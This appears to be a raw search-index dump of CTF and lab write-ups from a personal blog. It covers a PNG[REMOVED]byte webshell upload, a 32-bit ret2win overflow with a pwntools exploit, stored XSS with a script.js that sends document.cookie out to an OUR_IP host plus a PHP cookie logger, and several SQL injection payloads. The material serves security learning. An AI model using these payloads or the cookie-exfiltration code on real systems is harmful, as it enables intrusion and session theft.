crawlers, but we can still access them manually.\nContents of instructions.txt:\nLet\u0026#39;s create a web app for PNG Images processing. It needs to: Allow users to upload PNG images look for \u0026#34;.png\u0026#34; extension in the submitted files make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain \u0026#39;PNG\u0026#39; in hexadecimal: \u0026#34;50 4E 47\u0026#34; ) after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing. Based on this, if we can create a script with the correct PNG magic bytes, we might be able to upload and execute it.\nCreating a Script with PNG Magic Bytes: I modified these two lines from https://gist.github.com/Techbrunch/56415c360daf4d039975267586c45d8c:\necho \u0026#39;89 50 4E 47 0D 0A 1A 0A\u0026#39; | xxd -p -r \u0026gt;\u0026gt; shell.php.png cat shell.php \u0026gt;\u0026gt; shell.php.png The key here is to write the magic bytes first, followed by the code you want to execute.\nUploading the Script I uploaded the file shell.php.png.\nHowever, I encountered an error:\nAfter troubleshooting, I realized my mistake: I named the file shell.php.png. Because of the .png extension, the app treated it as an image file rather than a script. This caused an error instead of executing the code.\nOnce I renamed the file and corrected the mistake, I successfully executed the command whoami.\nFrom here, a bit of lateral movement helped me locate the flag. Happy hacking!\n","permalink":"https://joonkim0625.github.io/posts/2024-11-26-picoctf-trickster/","summary":"\u003ch2 id=\"trickster\"\u003eTrickster\u003c/h2\u003e\n\u003cp\u003eAuthor: Junias Bonou\u003c/p\u003e\n\u003cp\u003eDescription\nI found a web app that can help process images: PNG images only! Try it here!\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"picoctf-trickster\" loading=\"lazy\" src=\"/images/picoctf-trickster/picoctf-trickster.png\"\u003e\u003c/p\u003e\n\u003cp\u003eWhen I attempted to upload some random files, I got the following error message:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eError: File name does not contain '.png'.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis suggests that the app strictly checks for .png extensions. To dig deeper, we can perform a directory search to see if we can find anything useful. A tool like gobuster is perfect for this kind of task.\u003c/p\u003e","title":"PicoCTF Trickster"},{"content":"Description Can you use the portals to get to the right place? You are provided with a 32-bit executable:\n└─$ file portal portal: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=2777afda2049624cbbecde55650e58f347efcd29, for GNU/Linux 3.2.0, not stripped Using checksec on this binary reveals that there are no security defenses enabled:\n[*] \u0026#39;/home/kali/ctf/uscctf2024/pwn/portal/portal\u0026#39; Arch: i386-32-little RELRO: No RELRO Stack: No canary found NX: NX unknown - GNU_STACK missing PIE: No PIE (0x8048000) Stack: Executable RWX: Has RWX segments Stripped: No This is a straightforward \u0026ldquo;return-to-win\u0026rdquo; challenge. Upon inspecting the binary with objdump, you can see that the function win is the goal:\n... 080491f6 \u0026lt;get_return_address\u0026gt;: 80491f6: 55 push %ebp 80491f7: 89 e5 mov %esp,%ebp 80491f9: e8 38 01 00 00 call 8049336 \u0026lt;__x86.get_pc_thunk.ax\u0026gt; 80491fe: 05 16 21 00 00 add $0x2116,%eax 8049203: 8b 45 04 mov 0x4(%ebp),%eax 8049206: 5d pop %ebp 8049207: c3 ret 08049208 \u0026lt;win\u0026gt;: 8049208: 55 push %ebp 8049209: 89 e5 mov %esp,%ebp 804920b: 53 push %ebx 804920c: 83 ec 44 sub $0x44,%esp 804920f: e8 1c ff ff ff call 8049130 \u0026lt;__x86.get_pc_thunk.bx\u0026gt; 8049214: 81 c3 00 21 00 00 add $0x2100,%ebx 804921a: 83 ec 08 sub $0x8,%esp 804921d: 8d 83 f4 ec ff ff lea -0x130c(%ebx),%eax 8049223: 50 push %eax 8049224: 8d 83 f6 ec ff ff lea -0x130a(%ebx),%eax 804922a: 50 push %eax 804922b: e8 90 fe ff ff call 80490c0 \u0026lt;fopen@plt\u0026gt; 8049230: 83 c4 10 add $0x10,%esp 8049233: 89 45 f4 mov %eax,-0xc(%ebp) 8049236: 83 7d f4 00 cmpl $0x0,-0xc(%ebp) 804923a: 75 1c jne 8049258 \u0026lt;win+0x50\u0026gt; 804923c: 83 ec 0c sub $0xc,%esp 804923f: 8d 83 00 ed ff ff lea -0x1300(%ebx),%eax 8049245: 50 push %eax 8049246: e8 45 fe ff ff call 8049090 \u0026lt;puts@plt\u0026gt; 804924b: 83 c4 10 add $0x10,%esp 804924e: 83 ec 0c sub $0xc,%esp 8049251: 6a 00 push $0x0 8049253: e8 48 fe ff ff call 80490a0 \u0026lt;exit@plt\u0026gt; 8049258: 83 ec 04 sub $0x4,%esp 804925b: ff 75 f4 push -0xc(%ebp) 804925e: 6a 2d push $0x2d 8049260: 8d 45 c7 lea -0x39(%ebp),%eax 8049263: 50 push %eax 8049264: e8 07 fe ff ff call 8049070 \u0026lt;fgets@plt\u0026gt; 8049269: 83 c4 10 add $0x10,%esp 804926c: 83 ec 0c sub $0xc,%esp 804926f: 8d 45 c7 lea -0x39(%ebp),%eax 8049272: 50 push %eax 8049273: e8 d8 fd ff ff call 8049050 \u0026lt;printf@plt\u0026gt; 8049278: 83 c4 10 add $0x10,%esp 804927b: 90 nop 804927c: 8b 5d fc mov -0x4(%ebp),%ebx 804927f: c9 leave 8049280: c3 ret 08049281 \u0026lt;vuln\u0026gt;: 8049281: 55 push %ebp 8049282: 89 e5 mov %esp,%ebp 8049284: 53 push %ebx 8049285: 83 ec 24 sub $0x24,%esp 8049288: e8 a3 fe ff ff call 8049130 \u0026lt;__x86.get_pc_thunk.bx\u0026gt; 804928d: 81 c3 87 20 00 00 add $0x2087,%ebx 8049293: 83 ec 0c sub $0xc,%esp 8049296: 8d 45 d8 lea -0x28(%ebp),%eax 8049299: 50 push %eax 804929a: e8 c1 fd ff ff call 8049060 \u0026lt;gets@plt\u0026gt; 804929f: 83 c4 10 add $0x10,%esp 80492a2: e8 4f ff ff ff call 80491f6 \u0026lt;get_return_address\u0026gt; 80492a7: 83 ec 08 sub $0x8,%esp 80492aa: 50 push %eax 80492ab: 8d 83 4c ed ff ff lea -0x12b4(%ebx),%eax 80492b1: 50 push %eax 80492b2: e8 99 fd ff ff call 8049050 \u0026lt;printf@plt\u0026gt; 80492b7: 83 c4 10 add $0x10,%esp 80492ba: 90 nop 80492bb: 8b 5d fc mov -0x4(%ebp),%ebx 80492be: c9 leave 80492bf: c3 ret 080492c0 \u0026lt;main\u0026gt;: 80492c0: 8d 4c 24 04 lea 0x4(%esp),%ecx 80492c4: 83 e4 f0 and $0xfffffff0,%esp 80492c7: ff 71 fc push -0x4(%ecx) 80492ca: 55 push %ebp 80492cb: 89 e5 mov %esp,%ebp 80492cd: 53 push %ebx 80492ce: 51 push %ecx 80492cf: 83 ec 10 sub $0x10,%esp 80492d2: e8 59 fe ff ff call 8049130 \u0026lt;__x86.get_pc_thunk.bx\u0026gt; 80492d7: 81 c3 3d 20 00 00 add $0x203d,%ebx 80492dd: 8b 83 fc ff ff ff mov -0x4(%ebx),%eax 80492e3: 8b 00 mov (%eax),%eax 80492e5: 6a 00 push $0x0 80492e7: 6a 02 push $0x2 80492e9: 6a 00 push $0x0 80492eb: 50 push %eax 80492ec: e8 bf fd ff ff call 80490b0 \u0026lt;setvbuf@plt\u0026gt; 80492f1: 83 c4 10 add $0x10,%esp 80492f4: e8 87 fd ff ff call 8049080 \u0026lt;getegid@plt\u0026gt; 80492f9: 89 45 f4 mov %eax,-0xc(%ebp) 80492fc: 83 ec 04 sub $0x4,%esp 80492ff: ff 75 f4 push -0xc(%ebp) 8049302: ff 75 f4 push -0xc(%ebp) 8049305: ff 75 f4 push -0xc(%ebp) 8049308: e8 c3 fd ff ff call 80490d0 \u0026lt;setresgid@plt\u0026gt; 804930d: 83 c4 10 add $0x10,%esp 8049310: 83 ec 0c sub $0xc,%esp 8049313: 8d 83 88 ed ff ff lea -0x1278(%ebx),%eax 8049319: 50 push %eax 804931a: e8 71 fd ff ff call 8049090 \u0026lt;puts@plt\u0026gt; 804931f: 83 c4 10 add $0x10,%esp 8049322: e8 5a ff ff ff call 8049281 \u0026lt;vuln\u0026gt; 8049327: b8 00 00 00 00 mov $0x0,%eax 804932c: 8d 65 f8 lea -0x8(%ebp),%esp 804932f: 59 pop %ecx 8049330: 5b pop %ebx 8049331: 5d pop %ebp 8049332: 8d 61 fc lea -0x4(%ecx),%esp 8049335: c3 ret ... The win function executes some operations, such as printing a flag. To exploit this, the program flow must be redirected to the win function.\nAnalyzing the Program Running the binary prompts for input:\nPlease enter your string: ABC Okay, time to return... Fingers Crossed... Jumping to 0x80492a7 The program takes your input and overwrites the return address on the stack. By analyzing its behavior in gdb, you can determine how to craft the payload. Sending a long input, such as 100 As, crashes the program:\n*EBP 0x41414141 (\u0026#39;AAAA\u0026#39;) *ESP 0xffffcedc ◂— \u0026#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#39; *EIP 0x80492bf (vuln+62) ◂— ret ───────────────────────────────────[ DISASM / i386 / set emulate on ]─────────────────────────────────── 0x80492b2 \u0026lt;vuln+49\u0026gt; call printf@plt \u0026lt;printf@plt\u0026gt; 0x80492b7 \u0026lt;vuln+54\u0026gt; add esp, 0x10 ESP =\u0026gt; 0xffffceb0 (0xffffcea0 + 0x10) 0x80492ba \u0026lt;vuln+57\u0026gt; nop 0x80492bb \u0026lt;vuln+58\u0026gt; mov ebx, dword ptr [ebp - 4] EBX, [0xffffced4] =\u0026gt; 0x41414141 (\u0026#39;AAAA\u0026#39;) 0x80492be \u0026lt;vuln+61\u0026gt; leave ► 0x80492bf \u0026lt;vuln+62\u0026gt; ret \u0026lt;0x41414141\u0026gt; ↓ ───────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────── 00:0000│ esp 0xffffcedc ◂— \u0026#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#39; ... ↓ 7 skipped ─────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────── ► 0 0x80492bf vuln+62 1 0x41414141 None 2 0x41414141 None 3 0x41414141 None 4 0x41414141 None 5 0x41414141 None 6 0x41414141 None 7 0x41414141 None ──────────────────────────────────────────────────────────────────────────────────────────────────────── pwndbg\u0026gt; ni 0x41414141 in ?? () LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA ─────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────── EAX 0x40 EBX 0x41414141 (\u0026#39;AAAA\u0026#39;) ECX 0 EDX 0 EDI 0xf7ffcb60 (_rtld_global_ro) ◂— 0 ESI 0xffffcfcc —▸ 0xffffd1d8 ◂— \u0026#39;COLORFGBG=15;0\u0026#39; EBP 0x41414141 (\u0026#39;AAAA\u0026#39;) *ESP 0xffffcee0 ◂— \u0026#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#39; *EIP 0x41414141 (\u0026#39;AAAA\u0026#39;) ───────────────────────────────────[ DISASM / i386 / set emulate on ]─────────────────────────────────── Invalid address 0x41414141 At this point, you control the EIP register. When a function returns, the ret instruction pops the top value of the stack into EIP, redirecting execution to that address.\nFinding the Offset To determine the exact offset where the buffer overflow occurs, use a cyclic pattern:\n───────────────────────────────────[ DISASM / i386 / set emulate on ]─────────────────────────────────── ► 0x80491f9 \u0026lt;get_return_address+3\u0026gt; call __x86.get_pc_thunk.ax \u0026lt;__x86.get_pc_thunk.ax\u0026gt; arg[0]: 0xffffced8 ◂— \u0026#39;kaaalaaama\u0026#39; arg[1]: 0x80492a7 (vuln+38) ◂— sub esp, 8 arg[2]: 0x61616161 (\u0026#39;aaaa\u0026#39;) arg[3]: 0x61616162 (\u0026#39;baaa\u0026#39;) 0x80491fe \u0026lt;get_return_address+8\u0026gt; add eax, 0x2116 0x8049203 \u0026lt;get_return_address+13\u0026gt; mov eax, dword ptr [ebp + 4] 0x8049206 \u0026lt;get_return_address+16\u0026gt; pop ebp 0x8049207 \u0026lt;get_return_address+17\u0026gt; ret 0x8049208 \u0026lt;win\u0026gt; push ebp 0x8049209 \u0026lt;win+1\u0026gt; mov ebp, esp 0x804920b \u0026lt;win+3\u0026gt; push ebx 0x804920c \u0026lt;win+4\u0026gt; sub esp, 0x44 0x804920f \u0026lt;win+7\u0026gt; call __x86.get_pc_thunk.bx \u0026lt;__x86.get_pc_thunk.bx\u0026gt; 0x8049214 \u0026lt;win+12\u0026gt; add ebx, 0x2100 ───────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────── 00:0000│ ebp esp 0xffffcea8 —▸ 0xffffced8 ◂— \u0026#39;kaaalaaama\u0026#39; 01:0004│+004 0xffffceac —▸ 0x80492a7 (vuln+38) ◂— sub esp, 8 02:0008│ eax 0xffffceb0 ◂— \u0026#39;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama\u0026#39; 03:000c│+00c 0xffffceb4 ◂— \u0026#39;baaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama\u0026#39; 04:0010│+010 0xffffceb8 ◂— \u0026#39;caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama\u0026#39; 05:0014│+014 0xffffcebc ◂— \u0026#39;daaaeaaafaaagaaahaaaiaaajaaakaaalaaama\u0026#39; 06:0018│+018 0xffffcec0 ◂— \u0026#39;eaaafaaagaaahaaaiaaajaaakaaalaaama\u0026#39; 07:001c│+01c 0xffffcec4 ◂— \u0026#39;faaagaaahaaaiaaajaaakaaalaaama\u0026#39; ─────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────── ► 0 0x80491f9 get_return_address+3 1 0x80492a7 vuln+38 2 0x6161616c None 3 0xff00616d None 4 0xf7d87964 None ──────────────────────────────────────────────────────────────────────────────────────────────────────── pwndbg\u0026gt; c Continuing. Okay, time to return... Fingers Crossed... Jumping to 0x80492a7 Program received signal SIGSEGV, Segmentation fault. 0x6161616c in ?? () LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA ─────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────── *EAX 0x40 *EBX 0x6161616a (\u0026#39;jaaa\u0026#39;) *ECX 0 EDX 0 EDI 0xf7ffcb60 (_rtld_global_ro) ◂— 0 ESI 0xffffcfcc —▸ 0xffffd1d8 ◂— \u0026#39;COLORFGBG=15;0\u0026#39; *EBP 0x6161616b (\u0026#39;kaaa\u0026#39;) *ESP 0xffffcee0 ◂— 0xff00616d /* \u0026#39;ma\u0026#39; */ *EIP 0x6161616c (\u0026#39;laaa\u0026#39;) ───────────────────────────────────[ DISASM / i386 / set emulate on ]─────────────────────────────────── Invalid address 0x6161616c As you can see, it tells you that -x6161616c was used to jump to that location which isn\u0026rsquo;t available obviously.\npwndbg\u0026gt; cyclic -l 0x6161616c Finding cyclic pattern of 4 bytes: b\u0026#39;laaa\u0026#39; (hex: 0x6c616161) Found at offset 44 This tells us that the buffer can hold 44 junk bytes before overwriting EIP. The final payload consists of:\n44 bytes of junk The address of the win function (0x08049208). Crafting the Exploit Using pwntools, you can automate the exploit:\nfrom pwn import * context.update(arch=\u0026#39;i386\u0026#39;, os=\u0026#39;linux\u0026#39;) #p = process(\u0026#34;./portal\u0026#34;) p = remote(\u0026#39;0.cloud.chals.io\u0026#39;, 11723) payload = b\u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#34; payload += p32(0x08049208) p.sendline(payload) p.interactive() Results Running the script produces:\n└─$ python solve.py [+] Opening connection to 0.cloud.chals.io on port 11723: Done [*] Switching to interactive mode Please enter your string: Okay, time to return... Fingers Crossed... Jumping to 0x80492a7 CYBORG{w0w_u_r_0n_y0ur_w4y_2_b_a_r34l_h4x0r![*] Got EOF while reading in interactive Conclusion Although 32-bit executables are less common today due to the widespread adoption of 64-bit systems, they are still found in legacy applications, embedded systems, and challenges like this. Understanding how to exploit 32-bit binaries remains a valuable skill for learning system internals and practicing reverse engineering.\n","permalink":"https://joonkim0625.github.io/posts/2024-11-15-uscctf2024-pwn-portal/","summary":"\u003ch2 id=\"description\"\u003eDescription\u003c/h2\u003e\n\u003cpre\u003e\u003ccode\u003eCan you use the portals to get to the right place?\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eYou are provided with a 32-bit executable:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e└─$ file portal \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eportal: ELF 32-bit LSB executable, Intel 80386, version \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eSYSV\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e, dynamically linked, interpreter /lib/ld-linux.so.2, BuildID\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003esha1\u003cspan style=\"color:#f92672\"\u003e]=\u003c/span\u003e2777afda2049624cbbecde55650e58f347efcd29, \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e GNU/Linux 3.2.0, not stripped\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eUsing checksec on this binary reveals that there are no security defenses enabled:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;/home/kali/ctf/uscctf2024/pwn/portal/portal\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    Arch:       i386-32-little\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    RELRO:      No RELRO\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    Stack:      No canary found\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    NX:         NX unknown - GNU_STACK missing\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    PIE:        No PIE \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e0x8048000\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    Stack:      Executable\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    RWX:        Has RWX segments\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    Stripped:   No\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eThis is a straightforward \u0026ldquo;return-to-win\u0026rdquo; challenge. Upon inspecting the binary with objdump, you can see that the function win is the goal:\u003c/p\u003e","title":"USCCTF2024 Pwn Portal"},{"content":"The search bar didn’t seem to be a viable target for XSS injection because either it simply echoes the search query or it sanitizes/blocks the payloads I tested (for example, the payloads generated by XSStrike didn’t work).\nNext, I explored the \u0026ldquo;Leave a Comment\u0026rdquo; section, which includes multiple input fields. When posting a comment, I noticed that the inputs aren’t reflected directly back on the page. Searching for a comment only shows the search result, not the actual comment content, which means we need to identify which input area, if any, is vulnerable.\nRecalling previous lessons from this module, I realized I’d need to set up a server and have the payload communicate with it to capture any potential output. Since the comment section sends input data in the body of a POST request—and I wasn’t sure how to approach this with XSStrike—I decided to try some simple payloads from the module.\nFirst, I set up a server using the following command:\nsudo php -S 0.0.0.0:80 Then, I tested this payload in each input field:\n\u0026lt;script src=\u0026#34;http://OUR_IP/comment\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;http://OUR_IP/name\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; Note: you can check your IP address by running ip a then check for the IPv4 of tun0.\nThis attempt produced the following server response:\n[Wed Nov 13 23:35:47 2024] PHP 8.2.24 Development Server (http://0.0.0.0:80) started [Wed Nov 13 23:50:43 2024] 10.129.50.237:59944 Accepted [Wed Nov 13 23:50:43 2024] 10.129.50.237:59944 [404]: GET /website - No such file or directory In my second attempt, I used a payload starting with \u0026ldquo;\u0026gt; to potentially break out of any attributes, but only the \u0026ldquo;website\u0026rdquo; input generated a response.\nSince the task is to locate a flag embedded in a cookie, I decided to implement a technique introduced in the module. First, I created a script.js file with this code to capture the cookie data:\nnew Image().src=\u0026#39;http://OUR_IP/index.php?c=\u0026#39;+document.cookie; Then, I used the following PHP code for index.php to capture and store the cookie:\n\u0026lt;?php if (isset($_GET[\u0026#39;c\u0026#39;])) { $list = explode(\u0026#34;;\u0026#34;, $_GET[\u0026#39;c\u0026#39;]); foreach ($list as $value) { $cookie = urldecode($value); $file = fopen(\u0026#34;cookies.txt\u0026#34;, \u0026#34;a+\u0026#34;); fputs($file, \u0026#34;Victim IP: {$_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]} | Cookie: {$cookie}\\n\u0026#34;); fclose($file); } } ?\u0026gt; Once these files were ready, I used this payload to trigger the script:\n\u0026lt;script src=\u0026#34;http://OUR_IP/script.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; After posting a new comment with this payload, I observed the following server response:\n[Wed Nov 13 23:58:54 2024] 10.129.50.237:60158 [200]: GET /index.php?c=wordpress_test_cookie=WP%20Cookie%20check;%20wp-settings-time-2=1731563934;%20flag=\u0026lt;FLAG_VALUE\u0026gt; That was it!\nReflection and Key Takeaways Overall, the assessment was somewhat simpler than I expected, though I was disappointed I couldn’t leverage XSStrike for this task. I realize I need to improve my ability to use new tools by thoroughly reviewing their documentation, which I’m still working on. Overall, this was a fun and insightful module!\n","permalink":"https://joonkim0625.github.io/posts/2024-11-14-xss-skills-assessment/","summary":"\u003cp\u003eThe search bar didn’t seem to be a viable target for XSS injection because either it simply echoes the search query or it sanitizes/blocks the payloads I tested (for example, the payloads generated by XSStrike didn’t work).\u003c/p\u003e\n\u003cp\u003eNext, I explored the \u0026ldquo;Leave a Comment\u0026rdquo; section, which includes multiple input fields. When posting a comment, I noticed that the inputs aren’t reflected directly back on the page. Searching for a comment only shows the search result, not the actual comment content, which means we need to identify which input area, if any, is vulnerable.\u003c/p\u003e","title":"XSS Skills Assessment"},{"content":"A challenge about SLQi that uses Union injection technique.\nWhat is convenient about this challenge is it shows the query that is used to pull the data from the database. I used these SQL injection cheat sheet that is from the SQLi fundamental module from the HTB academy:\ncn\u0026#39; UNION select 1,database(),2,3-- - Current database name cn\u0026#39; UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- - List all databases cn\u0026#39; UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema=\u0026#39;dev\u0026#39;-- - List all tables in a specific database cn\u0026#39; UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name=\u0026#39;credentials\u0026#39;-- - List all columns in a specific table Steps I took based on the cheat sheet from the HTB Academy:\nFind the current database I am in (or you could list all databases) flag I had to add extra columns to make the injection work List all tables in this specific database Again, flag List all columns in this table Again, only flag So, once I gathered this information, I used the following query to get the flag:\ncn' UNION select flag, null, null, null, null from flag-- -\nThen I got this response:\n[ { \u0026#34;id\u0026#34;: \u0026#34;HTB{uN10n_1nj3ct10n_4r3_345y_t0_l34rn_r1gh17?}\u0026#34;, \u0026#34;name\u0026#34;: null, \u0026#34;description\u0026#34;: null, \u0026#34;origin\u0026#34;: null, \u0026#34;created_at\u0026#34;: null } ] This was a good easy practice challenge that I worked on from the HTB academy module!\n","permalink":"https://joonkim0625.github.io/posts/2024-10-27-unholy-union/","summary":"\u003cp\u003eA challenge about SLQi that uses Union injection technique.\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"unholy-main\" loading=\"lazy\" src=\"/images/Unholy.png\"\u003e\u003c/p\u003e\n\u003cp\u003eWhat is convenient about this challenge is it shows the query that is used to pull the data from the database. I used these SQL injection cheat sheet that is from the SQLi fundamental module from the HTB academy:\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ecn\u0026#39; UNION select 1,database(),2,3-- - \tCurrent database name\ncn\u0026#39; UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- - \tList all databases\ncn\u0026#39; UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema=\u0026#39;dev\u0026#39;-- - \tList all tables in a specific database\ncn\u0026#39; UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name=\u0026#39;credentials\u0026#39;-- - \tList all columns in a specific table\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eSteps I took based on the cheat sheet from the HTB Academy:\u003c/p\u003e","title":"Unholy Union"},{"content":"This is a challenge from webhacking.kr. As the name of the website suggests, it is about SQL injection. You can check the source code of the page:\n\u0026lt;?php if($_GET[\u0026#39;no\u0026#39;]){ $db = dbconnect(); if(preg_match(\u0026#34;/ |\\/|\\(|\\)|\\||\u0026amp;|select|from|0x/i\u0026#34;,$_GET[\u0026#39;no\u0026#39;])) exit(\u0026#34;no hack\u0026#34;); $result = mysqli_fetch_array(mysqli_query($db,\u0026#34;select id from chall18 where id=\u0026#39;guest\u0026#39; and no=$_GET[no]\u0026#34;)); // admin\u0026#39;s no = 2 if($result[\u0026#39;id\u0026#39;]==\u0026#34;guest\u0026#34;) echo \u0026#34;hi guest\u0026#34;; if($result[\u0026#39;id\u0026#39;]==\u0026#34;admin\u0026#34;){ solve(18); echo \u0026#34;hi admin!\u0026#34;; } } ?\u0026gt; Our goal seems to be creating a payload that would make the id value admin and also make the no value 2. So, let\u0026rsquo;s assume that there is no filter so we can enter anything as a payload. When we enter 2 as our input, you will see something like this:\nSo, because of this where id='guest' and no=$_GET[no] line, we can try to inject SQLi through this. We want the id='admin' for sure. So, it can look something like no=2 or id='admin'\nFrom the page source code, we can see that there is a preg_match function that filters some of the characters and words that can be possibly used for SQLi. As you can see, the first part of the regex filters out the space character. We can bypass this by using an URL encoded payload that represents a tab character which is %09.\nno=2%09or%09id='admin'\nIf you use this payload, you will see the message that you have solved the challenge.\n","permalink":"https://joonkim0625.github.io/posts/2024-10-25-webhackingkr-old-18/","summary":"\u003cp\u003eThis is a challenge from \u003ccode\u003ewebhacking.kr\u003c/code\u003e. As the name of the website suggests, it is about SQL injection. You can check the source code of the page:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-php\" data-lang=\"php\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e\u0026lt;?\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ephp\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e($_GET[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;no\u0026#39;\u003c/span\u003e]){\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  $db \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003edbconnect\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003epreg_match\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/ |\\/|\\(|\\)|\\||\u0026amp;|select|from|0x/i\u0026#34;\u003c/span\u003e,$_GET[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;no\u0026#39;\u003c/span\u003e])) \u003cspan style=\"color:#66d9ef\"\u003eexit\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;no hack\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  $result \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emysqli_fetch_array\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003emysqli_query\u003c/span\u003e($db,\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;select id from chall18 where id=\u0026#39;guest\u0026#39; and no=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e$_GET[no]\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e)); \u003cspan style=\"color:#75715e\"\u003e// admin\u0026#39;s no = 